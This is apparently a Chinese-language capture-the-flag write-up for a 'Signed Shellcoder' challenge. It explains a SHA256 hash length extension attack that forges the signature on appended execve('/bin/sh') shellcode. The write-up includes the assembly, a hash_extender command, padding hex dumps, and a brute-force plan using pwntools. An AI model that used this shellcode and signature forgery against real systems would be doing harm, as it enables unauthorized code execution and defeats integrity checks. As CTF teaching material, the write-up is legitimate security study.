# Signed Shellcoder

这段代码能干啥？

```assembly
# put message into stack
for ch in msg[::-1]:
	mov rcx, {ch}
	push rcx

mov rdi, 1
mov rsi, rsp
mov rdx, {msg_len}
mov rax, 1 # SYS_WRITE

# syscall(SYS_WRITE, STD_OUT, STACK, msg_len)
syscall

add {reg}, rcx
```

会通过 SHA256 对这些生成的代码签名，不符合的不予运行。

看起来好安全。

我希望能生成对应这段代码

```assembly
# put `/bin/sh` into stack
for ch in msg[::-1]:
	mov rcx, {ch}
	push rcx
	
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 59 # SYS_EXECVE

# syscall(SYS_EXECVE, STACK, 0, 0)
syscall
```

的正确签名，并交给他执行。

然而……签名的过程是这样的：

1. 随机生成一个 32 ～ 64 字节的 Key，保存在 `SECRET_KEY` 中备用；
2. 随机选择一个 0 ～ 15 的数字，放在 `BKEY` 中备用；

Hash 的过程是，将 SECRET_KEY + data 交给 SHA256 进行 Digest，并且将其最后一位和 BKEY 做异或。得到的结果和 data 打包交给 Shellcoder。

> 后面半段就是数字签名嘛

解密的时候，所进行的操作是分离出 Signature 和 Data，对 Data 再进行一次 Digest，和 Signature 进行比较，从而判定这一 Shellcoder 是否合法。

换句话说，就是要伪造出「代码的数字签名」，骗过 Shellcoder。

换句话说，要在不知道 SECRET_KEY 的情况下，生成一对 (Data, Signature)（其中 Data 是恶意的）能通过 `hash_data` 检验。

显然，这里面用的 SHA256 算法就适用哈希扩展攻击。

不需要就任意的 Data 得到任意的 Signature，只要通过已知的一对（Salt + Data, Sig）生成（Salt + Data + Suffix，New Sig）就可以了。

反正到时候都是要顺序执行的。

先生成（`/bin/sh` + `/rcx`）的一组 (Salt + Data, Sig)，然后只要在代码段後面添加上

```assembly
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 59 # SYS_EXECVE
```

就大功告成了。

[HashExtender](https://github.com/iagox86/hash_extender) 刚好支持这种奇妙的攻击方式。

用法如下：

```shell
yue$ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --format md5
```

原理是这样的。假定 Hash 时的内存排布是这样的：

```
0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......
0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......
```

因此我们构造这样的 Payload：

```
0000  64 61 74 61 80 00 00 00 00 00 00 00 00 00 00 00  data............
0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0030  00 00 50 00 00 00 00 00 00 00 61 70 70 65 6e 64  ..P.......append
```

因为 Padding 规则，会变成这样：

```
0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......
0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......
0040  61 70 70 65 6e 64                                append
```

让 append 独立于一个块进行 Hash，就有可能进行攻击。

这样做的条件是我们要知道 `secret` 的长度。好在根据 Python 脚本，这是一个 32 到 64 字节长的任意数字。

只要碰 32 次长度就好了。

但是，别忘了我们的 Hash 值最后一字节是被一个 0 ~ 16 的数字 XOR 过的。所以在不利用加密算法知识的情况下，我们还得尝试 16 倍的次数。

总的尝试次数也就 512 次，可以接受。

> 实际上 Hash Extender 提供了尝试不同长度的参数！太厉害了！

但是，好遗憾的是，这个 Python 脚本设置了 120 秒的超时。

我们没时间等下去！

得用 pwntools 自动化。

好了，现在应该已经伪造签名了。

![getshell](notes.assets/getshell.png)

在后面加入 Getshell 的代码就好了。

`shellcraft` 弄出来的过不了。手动写了一段用 `pwnlib.asm` 编译的就好了。

注意执行 Shellcode 的时候，设置了一个 1 秒钟的 Alarm。超过就自动结束，所以我们的 Shell 活不过一秒的。

> 但是，已经够了。

